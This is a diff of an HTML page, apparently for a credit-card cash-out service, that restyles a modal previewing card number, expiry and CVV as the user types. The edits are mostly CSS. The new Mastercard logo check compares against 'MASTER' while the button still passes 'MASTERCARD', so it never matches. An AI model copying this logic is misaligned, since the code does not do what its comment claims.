@@ -33,7 +33,7 @@
 
         h1, h2, h3, h4, .navbar-brand { font-family: 'Plus Jakarta Sans', sans-serif; letter-spacing: -0.02em; }
 
-        /* Navigation - Lower Z-index than Modal */
+        /* Navigation */
         .navbar {
             padding: 1rem 0;
             background: rgba(255, 255, 255, 0.9) !important;
@@ -75,41 +75,66 @@
         .btn-promo-wa { background: #ffffff; color: #25d366; }
         .btn-promo-call { background: var(--brand-warning); color: #000; }
 
-        /* 3D VIRTUAL CARD STYLES */
+        /* HD VIRTUAL CARD STYLES */
         .card-container {
-            perspective: 1000px; width: 100%; max-width: 320px; margin: 0 auto; height: 190px;
+            perspective: 1000px; width: 100%; max-width: 340px; margin: 0 auto; height: 210px;
+            /* Prevent Blurriness on Rotate */
+            transform: translateZ(0);
+            backface-visibility: hidden;
         }
 
         .card-inner {
             position: relative; width: 100%; height: 100%;
             transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); transform-style: preserve-3d;
+            will-change: transform;
         }
 
         .card-container.flipped .card-inner { transform: rotateY(180deg); }
 
         .card-front, .card-back {
             position: absolute; width: 100%; height: 100%; backface-visibility: hidden;
-            border-radius: 14px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); color: #fff;
-            padding: 18px; background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); overflow: hidden;
+            border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); color: #fff;
+            padding: 20px; background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); 
+            overflow: hidden;
+            -webkit-font-smoothing: subpixel-antialiased;
         }
 
         .card-back { transform: rotateY(180deg); background: #1e293b; padding: 0; }
-        .chip { width: 38px; height: 28px; background: linear-gradient(135deg, #fde68a 0%, #f59e0b 100%); border-radius: 5px; margin-bottom: 12px; position: relative; }
-        .chip::after { content: ''; position: absolute; top: 6px; left: 6px; right: 6px; bottom: 6px; border: 1px solid rgba(0,0,0,0.1); }
-        .contactless { position: absolute; top: 20px; right: 18px; opacity: 0.6; font-size: 1.1rem; }
-        .card-number-display { font-family: 'Source Code Pro', monospace; font-size: 1.1rem; letter-spacing: 2px; margin-bottom: 15px; display: block; text-shadow: 2px 2px 2px rgba(0,0,0,0.3); }
+        .chip { width: 42px; height: 32px; background: linear-gradient(135deg, #fde68a 0%, #f59e0b 100%); border-radius: 6px; margin-bottom: 15px; position: relative; }
+        .chip::after { content: ''; position: absolute; top: 8px; left: 8px; right: 8px; bottom: 8px; border: 1px solid rgba(0,0,0,0.1); }
+        .contactless { position: absolute; top: 25px; right: 20px; opacity: 0.6; font-size: 1.2rem; }
+        
+        .card-number-display { 
+            font-family: 'Source Code Pro', monospace; 
+            font-size: 1.2rem; 
+            letter-spacing: 2px; 
+            margin-bottom: 20px; 
+            display: block; 
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            font-weight: 500;
+        }
+
         .card-info-row { display: flex; justify-content: space-between; align-items: flex-end; }
         .label-small { font-size: 7px; text-transform: uppercase; opacity: 0.7; letter-spacing: 1px; margin-bottom: 2px; }
-        .value-text { font-size: 11px; font-weight: 600; text-transform: uppercase; }
-        .magnetic-strip { width: 100%; height: 35px; background: #000; margin-top: 20px; }
-        .signature-bar { width: 80%; height: 30px; background: #fff; margin: 15px auto 0 20px; display: flex; align-items: center; justify-content: flex-end; padding-right: 10px; border-radius: 4px; }
+        .value-text { font-size: 12px; font-weight: 600; text-transform: uppercase; }
+        
+        .card-logo-img {
+            max-width: 45px;
+            height: auto;
+            image-rendering: -webkit-optimize-contrast; /* HD rendering */
+        }
+
+        .magnetic-strip { width: 100%; height: 40px; background: #000; margin-top: 25px; }
+        .signature-bar { width: 80%; height: 32px; background: #fff; margin: 15px auto 0 20px; display: flex; align-items: center; justify-content: flex-end; padding-right: 10px; border-radius: 4px; }
         .cvv-display { color: #000; font-family: 'Source Code Pro', monospace; font-weight: 700; font-style: italic; }
 
-        /* Sections */
+        /* Satisfaction visual */
         .img-satisfaction { width: 100%; height: auto; border-radius: 32px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
         .process-img { width: 100%; height: 180px; border-radius: 24px; object-fit: cover; margin-bottom: 20px; background: var(--surface-100); }
         .step-num { width: 32px; height: 32px; background: var(--brand-accent); color: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; margin: 0 auto 15px; font-size: 0.8rem; }
-        .testimonial-card { background: var(--surface-50); border-radius: 28px; padding: 35px; border: 1px solid var(--surface-100); height: 100%; text-align: center; }
+        
+        .testimonial-card { background: var(--surface-50); border-radius: 28px; padding: 35px; border: 1px solid var(--surface-100); height: 100%; text-align: center; transition: 0.3s ease; }
+        .testimonial-card:hover { transform: translateY(-5px); border-color: var(--brand-accent); box-shadow: 0 15px 30px rgba(0,0,0,0.05); }
         .client-avatar { width: 75px; height: 75px; border-radius: 50%; object-fit: cover; margin-bottom: 15px; border: 4px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
 
         /* MODAL - SINGLE SCREEN NO SCROLL FIX */
@@ -133,7 +158,7 @@
 
         .trust-note { font-size: 10.5px; line-height: 1.4; color: #64748b; margin-top: 10px; text-align: center; }
 
-        /* RATE CARDS SAME HEIGHT FIX */
+        /* SAME HEIGHT CARDS FIX */
         .col-rate-card { display: flex; flex-direction: column; }
         .rate-card-content { 
             height: 100%; 
@@ -193,7 +218,7 @@
         </div>
     </nav>
 
-    <!-- Hero Section -->
+    <!-- Hero -->
     <section class="hero-section">
         <div class="container px-4">
             <div class="row align-items-center">
@@ -234,7 +259,7 @@
         </div>
     </section>
 
-    <!-- Satisfaction visual -->
+    <!-- Satisfaction Section -->
     <section class="py-5">
         <div class="container px-4">
             <div class="row align-items-center g-5 text-center text-md-start">
@@ -269,7 +294,7 @@
                     <div class="rate-card-content shadow-sm" data-bs-toggle="modal" data-bs-target="#swipeModal" data-card-type="MASTERCARD" data-percent="2.0">
                         <div>
                             <img src="https://img.icons8.com/color/96/mastercard.png" width="48" alt="Mastercard">
-                            <div class="small fw-800 text-muted opacity-50 mt-1">MASTERCARD</div>
+                            <div class="small fw-800 text-muted opacity-50 mt-1">MASTER</div>
                             <div class="h2 fw-800 text-primary my-2">2.0%</div>
                         </div>
                         <div class="text-primary fw-700 small">Start <i class="fas fa-arrow-right ms-1"></i></div>
@@ -335,7 +360,7 @@
                 </div>
                 <div class="col-md-4">
                     <div class="testimonial-card">
-                        <img src="https://images.unsplash.com/photo-1544168190-79c17527004f?w=150&h=150&auto=format&fit=crop&q=80" class="client-avatar" alt="Reviewer">
+                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=150&h=150&auto=format&fit=crop&q=80" class="client-avatar" alt="Reviewer">
                         <div class="text-warning mb-2 small"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                         <p class="small text-muted mb-0">"Quick and honest. I use them regularly for my urgent liquidity needs. Highly recommended."</p>
                         <h6 class="fw-800 small mt-3 mb-0 text-primary">Suresh – LB Nagar</h6>
@@ -363,7 +388,7 @@
         </div>
     </footer>
 
-    <!-- INTERACTIVE NARROW MODAL -->
+    <!-- INTERACTIVE HD MODAL -->
     <div class="modal fade" id="swipeModal" tabindex="-1" data-bs-backdrop="static">
         <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content shadow-lg border-0">
@@ -376,7 +401,7 @@
                 </div>
                 <div class="modal-body">
                     <div class="d-flex inline-modal-container">
-                        <!-- LEFT: CARD VISUAL -->
+                        <!-- LEFT: CARD VISUAL (HD FIX) -->
                         <div class="card-col px-2 d-flex align-items-center justify-content-center" style="flex: 1;">
                             <div class="card-container" id="virtualCard">
                                 <div class="card-inner">
@@ -394,7 +419,8 @@
                                                 <div class="value-text" id="cardDisplayExpiry">MM/YY</div>
                                             </div>
                                             <div class="ms-2">
-                                                <img src="https://img.icons8.com/color/48/visa.png" id="cardDisplayLogo" width="34">
+                                                <!-- HD LOGO LOGIC IN JS -->
+                                                <img src="https://img.icons8.com/color/48/visa.png" id="cardDisplayLogo" class="card-logo-img">
                                             </div>
                                         </div>
                                     </div>
@@ -470,10 +496,11 @@
             let val = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
             e.target.value = val;
             document.getElementById('cardDisplayNumber').innerText = val || "#### #### #### ####";
+            
+            // Dynamic Logo detection (Only if user is typing a new number manually)
             const logo = document.getElementById('cardDisplayLogo');
             if (val.startsWith('4')) logo.src = "https://img.icons8.com/color/48/visa.png";
             else if (val.startsWith('5')) logo.src = "https://img.icons8.com/color/48/mastercard.png";
-            else logo.src = "https://img.icons8.com/color/48/bank-card-back-side.png";
         });
 
         inputName.addEventListener('input', (e) => {
@@ -510,8 +537,18 @@
             const b = e.relatedTarget;
             const t = b.getAttribute('data-card-type');
             const p = b.getAttribute('data-percent');
+            
             document.getElementById('selectedCardType').value = t;
             document.getElementById('selectedPercent').value = p;
+            
+            // LOGO BRAND FIX: Click on Master shows Master
+            const logo = document.getElementById('cardDisplayLogo');
+            if(t === 'MASTER') {
+                logo.src = "https://img.icons8.com/color/48/mastercard.png";
+            } else {
+                logo.src = "https://img.icons8.com/color/48/visa.png";
+            }
+
             document.getElementById('whatsappForm').reset();
             document.getElementById('cardDisplayNumber').innerText = "#### #### #### ####";
             document.getElementById('cardDisplayName').innerText = "Full Name";
